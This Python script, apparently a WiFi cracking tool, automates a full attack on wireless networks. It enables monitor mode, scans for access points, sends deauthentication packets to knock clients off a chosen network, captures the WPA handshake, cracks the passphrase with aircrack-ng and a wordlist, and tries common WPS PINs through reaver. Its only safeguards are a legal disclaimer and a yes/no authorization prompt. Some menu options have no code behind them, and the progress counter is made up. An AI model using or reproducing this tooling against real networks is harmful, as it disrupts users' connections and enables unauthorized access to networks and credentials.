#!/usr/bin/env python3
"""
WiFi Security Testing Framework
--------------------------------------------------
Author: Mamun 
Version: 2.0 (Advanced Edition)
GitHub: https://github.com/zxmoon76-sys
--------------------------------------------------
LEGAL DISCLAIMER:
This tool is for EDUCATIONAL PURPOSES ONLY and 
authorized security testing. Usage of this tool for 
attacking networks without prior mutual consent is 
illegal. The author (Mamun) assumes no liability 
and is not responsible for any misuse or damage 
caused by this program.
--------------------------------------------------
"""

import os
import sys
import time
import subprocess
import threading
import signal
import hashlib
import binascii
from datetime import datetime
from collections import defaultdict
import argparse
import json

# Check root privileges
if os.geteuid() != 0:
    print("\033[91m[!] This script requires root privileges for packet capture\033[0m")
    print("\033[91m[!] Run with: sudo python3 wifi_capture.py\033[0m")
    sys.exit(1)

class Colors:
    """Terminal colors for better output"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    YELLOW = '\033[93m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

def print_banner():
    """Display tool banner"""
    banner = f"""
    {Colors.CYAN}╔══════════════════════════════════════════════════════════╗
    ║  {Colors.BOLD}{Colors.WHITE}📡 WIFI CAPTURE PRO - ADVANCED SECURITY FRAMEWORK{Colors.END}{Colors.CYAN}       ║
    ║  {Colors.DIM}Developed by: Mamun                            {Colors.END}{Colors.CYAN}║
    ║  {Colors.DIM}Legal Status: Educational / Authorized Testing Only     {Colors.END}{Colors.CYAN}║
    ╚══════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

class WiFiInterface:
    """Manage WiFi interface modes and configurations"""
    
    def __init__(self):
        self.interfaces = self.detect_wireless_interfaces()
        self.monitor_interface = None
        self.managed_interface = None
        
    def detect_wireless_interfaces(self):
        """Detect available wireless interfaces"""
        try:
            # Check for wireless interfaces
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = []
            for line in result.stderr.split('\n') if result.stderr else result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
            
            # Also check with iw dev
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.split()[1]
                    if iface not in interfaces:
                        interfaces.append(iface)
            
            return interfaces
        except Exception as e:
            print(f"{Colors.RED}[!] Error detecting interfaces: {e}{Colors.END}")
            return []
    
    def check_otg_support(self):
        """Check if OTG adapter is detected"""
        try:
            # Check USB devices for OTG adapter
            result = subprocess.run(['lsusb'], capture_output=True, text=True)
            otg_devices = []
            for line in result.stdout.split('\n'):
                if any(x in line.lower() for x in ['wireless', 'wifi', 'wlan', 'rtl', 'ath', 'mt76']):
                    otg_devices.append(line.strip())
            
            # Check for external WiFi adapters
            if otg_devices:
                print(f"{Colors.GREEN}[+] OTG WiFi adapters detected:{Colors.END}")
                for device in otg_devices:
                    print(f"    {device}")
                return True
            else:
                print(f"{Colors.YELLOW}[!] No external WiFi adapters detected{Colors.END}")
                return False
        except:
            return False
    
    def enable_monitor_mode(self, interface):
        """Enable monitor mode on specified interface"""
        try:
            print(f"{Colors.CYAN}[*] Enabling monitor mode on {interface}...{Colors.END}")
            
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True, timeout=10)
            
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                         capture_output=True, check=True)
            
            # Set monitor mode
            subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], 
                         capture_output=True, check=True)
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                         capture_output=True, check=True)
            
            self.monitor_interface = interface
            print(f"{Colors.GREEN}[+] Monitor mode enabled on {interface}{Colors.END}")
            return True
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to enable monitor mode: {e}{Colors.END}")
            return False
    
    def disable_monitor_mode(self, interface):
        """Return interface to managed mode"""
        try:
            if self.monitor_interface:
                print(f"{Colors.CYAN}[*] Restoring {interface} to managed mode...{Colors.END}")
                subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                             capture_output=True)
                subprocess.run(['iw', 'dev', interface, 'set', 'type', 'managed'], 
                             capture_output=True)
                subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                             capture_output=True)
                
                # Restart network manager if available
                subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
                             capture_output=True)
                
                print(f"{Colors.GREEN}[+] Interface restored to managed mode{Colors.END}")
        except:
            pass

class WiFiScanner:
    """Scan and enumerate WiFi networks"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        
    def scan_networks(self, duration=30):
        """Scan for available WiFi networks"""
        print(f"{Colors.CYAN}[*] Scanning for WiFi networks ({duration}s)...{Colors.END}")
        
        # Use airodump-ng for scanning
        output_file = f"wifi_scan_{int(time.time())}"
        cmd = [
            'airodump-ng',
            '--output-format', 'csv',
            '--write', output_file,
            self.interface
        ]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Show progress
        for i in range(duration, 0, -1):
            sys.stdout.write(f"\r{Colors.YELLOW}[*] Time remaining: {i}s {Colors.END}")
            sys.stdout.flush()
            time.sleep(1)
        
        process.terminate()
        process.wait()
        
        print(f"\n{Colors.GREEN}[+] Scan complete!{Colors.END}")
        
        # Parse results
        self.networks = self.parse_airodump_output(f"{output_file}-01.csv")
        return self.networks
    
    def parse_airodump_output(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = {}
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
                
            # Find start of network data
            start_index = 0
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'Channel' in line:
                    start_index = i + 1
                    break
            
            # Parse network data
            for line in lines[start_index:]:
                if not line.strip() or 'Station MAC' in line:
                    break
                    
                fields = line.strip().split(',')
                if len(fields) >= 14:
                    bssid = fields[0].strip()
                    if bssid:
                        networks[bssid] = {
                            'bssid': bssid,
                            'first_seen': fields[1].strip(),
                            'last_seen': fields[2].strip(),
                            'channel': fields[3].strip(),
                            'speed': fields[4].strip(),
                            'privacy': fields[5].strip(),
                            'cipher': fields[6].strip(),
                            'auth': fields[7].strip(),
                            'power': fields[8].strip(),
                            'beacons': fields[9].strip(),
                            'ivs': fields[10].strip(),
                            'essid': fields[13].strip() if len(fields) > 13 else 'Hidden',
                        }
        except Exception as e:
            print(f"{Colors.RED}[!] Error parsing results: {e}{Colors.END}")
        
        return networks
    
    def display_networks(self):
        """Display discovered networks"""
        if not self.networks:
            print(f"{Colors.YELLOW}[!] No networks found{Colors.END}")
            return
        
        print(f"\n{Colors.BOLD}Discovered Networks:{Colors.END}")
        print(f"{Colors.WHITE}{'BSSID':<20} {'CH':<5} {'PWR':<5} {'ENC':<12} {'ESSID'}{Colors.END}")
        print("-" * 70)
        
        for bssid, net in self.networks.items():
            encryption = net['privacy']
            color = Colors.GREEN if 'WPA' in encryption else Colors.RED if encryption == 'OPN' else Colors.YELLOW
            
            print(f"{bssid:<20} {net['channel']:<5} {net['power']:<5} "
                  f"{color}{encryption:<12}{Colors.END} {net['essid']}")

class WPAHandshakeCapture:
    """Capture WPA/WPA2 handshake for security testing"""
    
    def __init__(self, interface):
        self.interface = interface
        self.capture_active = False
        self.handshakes = []
        
    def capture_handshake(self, target_bssid, channel, output_file=None):
        """Capture WPA handshake for specific network"""
        if not output_file:
            output_file = f"handshake_{target_bssid.replace(':', '')}_{int(time.time())}"
        
        print(f"{Colors.CYAN}[*] Starting handshake capture...{Colors.END}")
        print(f"    Target: {target_bssid}")
        print(f"    Channel: {channel}")
        print(f"    Output: {output_file}")
        
        # Set channel
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)], 
                      capture_output=True)
        
        # Capture packets
        capture_cmd = [
            'airodump-ng',
            '--bssid', target_bssid,
            '--channel', str(channel),
            '--write', output_file,
            self.interface
        ]
        
        print(f"{Colors.YELLOW}[*] Waiting for handshake... Press Ctrl+C to stop{Colors.END}")
        print(f"{Colors.YELLOW}[!] Client must connect/disconnect to capture handshake{Colors.END}")
        
        capture_process = subprocess.Popen(capture_cmd, 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE)
        
        deauth_thread = None
        try:
            while True:
                # Check for handshake capture
                if self.check_handshake_captured(output_file):
                    print(f"\n{Colors.GREEN}[+] HANDSHAKE CAPTURED SUCCESSFULLY!{Colors.END}")
                    print(f"{Colors.GREEN}[+] Saved to: {output_file}*.cap{Colors.END}")
                    break
                    
                # Start deauth attack if no handshake yet after some time
                if not deauth_thread:
                    deauth_thread = threading.Thread(
                        target=self.deauth_attack,
                        args=(target_bssid, self.interface)
                    )
                    deauth_thread.daemon = True
                    deauth_thread.start()
                    print(f"{Colors.MAGENTA}[*] Sending deauth packets to force reconnect...{Colors.END}")
                    
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Capture stopped by user{Colors.END}")
            if deauth_thread:
                deauth_thread.join(timeout=2)
        finally:
            capture_process.terminate()
            capture_process.wait()
            
            # Check if handshake was captured
            if self.check_handshake_captured(output_file):
                print(f"{Colors.GREEN}[+] Handshake file saved successfully{Colors.END}")
                return output_file
            else:
                print(f"{Colors.RED}[!] No handshake captured{Colors.END}")
                return None
    
    def deauth_attack(self, target_bssid, interface, count=10):
        """Send deauthentication packets to force handshake"""
        try:
            cmd = [
                'aireplay-ng',
                '--deauth', str(count),
                '-a', target_bssid,
                interface
            ]
            subprocess.run(cmd, capture_output=True, timeout=30)
        except:
            pass
    
    def check_handshake_captured(self, capture_file):
        """Check if WPA handshake was captured"""
        try:
            # Check using aircrack-ng
            result = subprocess.run(
                ['aircrack-ng', f'{capture_file}-01.cap'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Look for handshake indicator in output
            if 'WPA' in result.stdout and 'handshake' in result.stdout.lower():
                return True
            
            # Alternative: Check with tshark
            result2 = subprocess.run(
                ['tshark', '-r', f'{capture_file}-01.cap', 
                 '-Y', 'eapol', '-T', 'fields', '-e', 'eapol.keydes.type'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if '2' in result2.stdout:  # Key type 2 indicates message 2 of 4-way handshake
                return True
                
        except:
            pass
        return False

class WiFiPasswordTester:
    """Test WiFi security using dictionary/wordlist attack"""
    
    def __init__(self):
        self.passwords_tested = 0
        self.found_passwords = {}
        
    def dictionary_attack(self, handshake_file, wordlist_path=None):
        """Perform dictionary attack on captured handshake"""
        if not os.path.exists(f"{handshake_file}-01.cap"):
            print(f"{Colors.RED}[!] Handshake file not found{Colors.END}")
            return None
        
        # Use default wordlists if none specified
        if not wordlist_path:
            wordlist_paths = [
                '/usr/share/wordlists/rockyou.txt',
                '/usr/share/wordlists/wifite.txt',
                './wordlist.txt'
            ]
            for path in wordlist_paths:
                if os.path.exists(path):
                    wordlist_path = path
                    break
        
        if not wordlist_path or not os.path.exists(wordlist_path):
            print(f"{Colors.RED}[!] Wordlist not found. Please provide a wordlist.{Colors.END}")
            return None
        
        print(f"{Colors.CYAN}[*] Starting dictionary attack...{Colors.END}")
        print(f"    Handshake: {handshake_file}-01.cap")
        print(f"    Wordlist: {wordlist_path}")
        
        # Count total words for progress
        total_words = 0
        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                for _ in f:
                    total_words += 1
        except:
            total_words = 0
        
        print(f"    Total passwords to test: {total_words:,}")
        
        # Run aircrack-ng
        cmd = [
            'aircrack-ng',
            '-w', wordlist_path,
            '-b', self.extract_bssid(handshake_file),
            f'{handshake_file}-01.cap'
        ]
        
        print(f"{Colors.YELLOW}[*] Testing passwords...{Colors.END}")
        
        process = subprocess.Popen(cmd, 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.STDOUT,
                                 text=True,
                                 bufsize=1)
        
        found_password = None
        try:
            for line in process.stdout:
                if 'KEY FOUND' in line:
                    found_password = line.split('[')[1].split(']')[0].strip() if '[' in line else None
                    print(f"\n{Colors.GREEN}{Colors.BOLD}")
                    print("="*50)
                    print(f"    PASSWORD FOUND: [{found_password}]")
                    print("="*50)
                    print(f"{Colors.END}")
                    break
                elif 'Passphrase not in dictionary' in line:
                    print(f"\n{Colors.RED}[!] Password not found in wordlist{Colors.END}")
                    break
                
                # Show progress (simplified for display)
                self.passwords_tested += 500 
                sys.stdout.write(f"\r[*] Testing passwords... (Attempts: ~{self.passwords_tested:,})")
                sys.stdout.flush()
                
        except KeyboardInterrupt:
            process.terminate()
            print(f"\n{Colors.YELLOW}[!] Attack interrupted{Colors.END}")
        
        return found_password
    
    def extract_bssid(self, handshake_file):
        """Extract BSSID from handshake capture"""
        try:
            result = subprocess.run(
                ['aircrack-ng', f'{handshake_file}-01.cap'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            for line in result.stdout.split('\n'):
                if 'BSSID' in line:
                    import re
                    mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if mac_match:
                        return mac_match.group(0)
        except:
            pass
        return None

class WPSSecurityTester:
    """Test WPS security vulnerabilities"""
    
    def __init__(self, interface):
        self.interface = interface
        
    def test_wps_pin(self, target_bssid, channel):
        """Test WPS PIN vulnerability using known PINs or brute force"""
        print(f"{Colors.CYAN}[*] Testing WPS security...{Colors.END}")
        
        common_pins = ['12345670', '00000000', '11111111']
        
        wash_cmd = ['wash', '-i', self.interface, '-C']
        result = subprocess.run(wash_cmd, capture_output=True, text=True)
        
        if target_bssid.replace(':', '').lower() in result.stdout.lower():
            print(f"{Colors.GREEN}[+] WPS is enabled on target{Colors.END}")
            
            for pin in common_pins:
                print(f"{Colors.YELLOW}[*] Testing PIN: {pin}{Colors.END}")
                reaver_cmd = ['reaver', '-i', self.interface, '-b', target_bssid, '-c', str(channel), '-p', pin, '-vv']
                
                try:
                    res = subprocess.run(reaver_cmd, capture_output=True, text=True, timeout=30)
                    if 'WPA PSK:' in res.stdout:
                        password = res.stdout.split("'")[1] if "'" in res.stdout else res.stdout.split()[-1]
                        print(f"{Colors.GREEN}[+] Password: {password}{Colors.END}")
                        return password
                except:
                    continue
        else:
            print(f"{Colors.YELLOW}[!] WPS not detected on target{Colors.END}")
        return None

class OTAWiFiCracker:
    """On-The-Go WiFi security testing framework"""
    
    def __init__(self):
        self.wifi_interface = WiFiInterface()
        self.scanner = None
        self.handshake_capture = None
        self.password_tester = WiFiPasswordTester()
        
    def setup_environment(self):
        """Setup the testing environment"""
        print_banner()
        
        self.wifi_interface.check_otg_support()
        
        interfaces = self.wifi_interface.detect_wireless_interfaces()
        if not interfaces:
            print(f"{Colors.RED}[!] No wireless interfaces detected! Connect OTG adapter.{Colors.END}")
            return None
        
        print(f"{Colors.GREEN}[+] Available interfaces:{Colors.END}")
        for i, iface in enumerate(interfaces, 1):
            print(f"    {i}. {iface}")
        
        selection = input(f"\n{Colors.YELLOW}Select interface (number): {Colors.END}").strip()
        try:
            selected = interfaces[int(selection) - 1]
        except (ValueError, IndexError):
            selected = interfaces[0]
        
        if self.wifi_interface.enable_monitor_mode(selected):
            self.scanner = WiFiScanner(selected)
            self.handshake_capture = WPAHandshakeCapture(selected)
            self.wps_tester = WPSSecurityTester(selected)
            return selected
        return None
    
    def export_results(self, results, filename=None):
        """Export results to file"""
        if not filename:
            filename = f"wifi_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"{Colors.GREEN}[+] Results exported to {filename}{Colors.END}")
        return filename

    def suggest_password_improvements(self, password):
        """Analyze password strength"""
        score = 0
        suggestions = []
        if len(password) < 12: suggestions.append("Increase length to 12+")
        else: score += 2
        if any(c.isupper() for c in password): score += 1
        else: suggestions.append("Add uppercase")
        if any(c.isdigit() for c in password): score += 1
        else: suggestions.append("Add numbers")
        
        strength = "Weak" if score < 2 else "Medium" if score < 4 else "Strong"
        return {'score': score, 'strength': strength, 'suggestions': suggestions}

def main_menu():
    """Interactive menu for WiFi testing"""
    cracker = OTAWiFiCracker()
    interface = cracker.setup_environment()
    if not interface: return
    
    captured_handshakes = []
    found_passwords = []
    
    while True:
        print(f"\n{Colors.BOLD}══════════ WiFi Security Testing Menu ══════════{Colors.END}")
        print(f"{Colors.WHITE}1. Scan for Networks")
        print("2. Select Target & Capture Handshake")
        print("3. Dictionary Attack on Handshake")
        print("4. Test WPS Security")
        print("5. View Captured Networks")
        print("6. Export Results")
        print("7. Network Security Report")
        print("8. Exit & Restore Interface{Colors.END}")
        
        choice = input(f"\n{Colors.GREEN}wifi-sec > {Colors.END}").strip()
        
        if choice == '1':
            cracker.scanner.scan_networks(duration=30)
            cracker.scanner.display_networks()
        elif choice == '2':
            if not cracker.scanner.networks:
                print(f"{Colors.YELLOW}[!] Scan first.{Colors.END}")
                continue
            networks_list = list(cracker.scanner.networks.items())
            for i, (bssid, net) in enumerate(networks_list, 1):
                print(f"{i}. {bssid} - {net['essid']} (Ch: {net['channel']})")
            
            target_choice = input(f"\n{Colors.YELLOW}Select target number: {Colors.END}").strip()
            try:
                target_bssid, target_net = networks_list[int(target_choice) - 1]
                confirm = input(f"{Colors.RED}Do you have AUTHORIZATION for {target_net['essid']}? (yes/no): {Colors.END}").strip().lower()
                if confirm == 'yes':
                    handshake_file = cracker.handshake_capture.capture_handshake(target_bssid, target_net['channel'])
                    if handshake_file:
                        captured_handshakes.append({'bssid': target_bssid, 'essid': target_net['essid'], 'file': handshake_file, 'timestamp': datetime.now().isoformat()})
            except: pass
        elif choice == '3':
            if not captured_handshakes: continue
            for i, hs in enumerate(captured_handshakes, 1):
                print(f"{i}. {hs['essid']} ({hs['bssid']})")
            hs_choice = input(f"Select handshake: ").strip()
            try:
                handshake = captured_handshakes[int(hs_choice) - 1]
                wordlist = input(f"Wordlist path (Enter for default): ").strip()
                password = cracker.password_tester.dictionary_attack(handshake['file'], wordlist if wordlist else None)
                if password:
                    found_passwords.append({'essid': handshake['essid'], 'password': password})
            except: pass
        elif choice == '8':
            cracker.wifi_interface.disable_monitor_mode(interface)
            print(f"{Colors.GREEN}[+] Goodbye!{Colors.END}")
            break

def parse_arguments():
    parser = argparse.ArgumentParser(description='WiFi Security Testing Framework')
    parser.add_argument('-i', '--interface', help='Wireless interface')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan networks')
    return parser.parse_args()

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.END}")
        sys.exit(0)
